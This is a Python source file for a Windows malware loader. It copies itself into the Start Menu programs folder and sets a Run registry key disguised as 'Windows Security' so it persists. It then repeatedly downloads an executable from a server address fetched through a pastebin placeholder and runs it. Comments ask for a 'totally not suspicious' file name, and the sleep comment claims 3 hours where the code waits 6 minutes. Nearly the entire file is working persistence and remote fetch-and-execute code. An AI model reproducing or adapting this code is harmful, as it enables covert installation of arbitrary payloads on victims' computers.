import requests
import sys
import os
import shutil
import winreg
import time


# import random
# from string import ascii_uppercase, digits


def insert_to_startup():
    # copy the file to C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}
    PATH = sys.argv[0]
    if not os.path.exists(
            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                         "programs")):
        os.makedirs(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                 "programs"))
    # Incase the file is already in it, else copy it
    try:
        shutil.copy(PATH,
                    os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                 "programs"))
    except shutil.SameFileError:
        pass

    user = os.getlogin()
    # Check if it's run as .py or .exe
    if sys.argv[0].endswith(".py"):
        FILE_NAME = sys.argv[0][sys.argv[0].rfind("/") + 1:]
    else:
        FILE_NAME = sys.argv[0][sys.argv[0].rfind("\\") + 1:]
    # Open the key, this would raise an WindowsError if the key doesn't exist
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                             winreg.KEY_ALL_ACCESS)
    except WindowsError:
        # Create the key since it does not exist
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")

    """
    # FIX MULTIPLE INSTANCE (Fixed below by checking which dir we are running from)
    # make 6 letters of random string
    random_string = ''.join(random.choice(ascii_uppercase + digits) for _ in range(6))
    winreg.SetValueEx(key, random_string, 0, winreg.REG_SZ,
                      f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")"""
    # Set the value on Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    winreg.SetValueEx(key, "Windows Security", 0, winreg.REG_SZ,
                      f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")
    winreg.CloseKey(key)


def download_payload(file_name, delete_before_trying):
    if delete_before_trying:
        try:
            os.remove(file_name)
        except FileNotFoundError:
            pass
    # Get the download link from the server
    d = requests.get(r"Change this to the pastebin link")
    # Download the file and save it to the same dir as the script
    r = requests.get(d.text, allow_redirects=True)

    with open(f"{file_name}.txt", "wb") as f:
        f.write(r.content)

    # change it to .exe
    os.rename(f"{file_name}.txt", f"{file_name}.exe")

    # run the exe and kill cmd task
    os.system(f"{file_name}.exe")
    os.system("taskkill /f /im cmd.exe")


first_run = True

while True:
    try:
        # check if it's run in C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs
        if os.getcwd() != os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs" and first_run is True:
            insert_to_startup()
            first_run = False
    except Exception:  # NOQA
        pass

    try:
        download_payload(file_name="put a totally not suspicious name here", delete_before_trying=True)
    except Exception:  # NOQA (No Quality Assurance, suppressed the warning)
        pass

    time.sleep(0.1 * 60 * 60)  # 3 hours
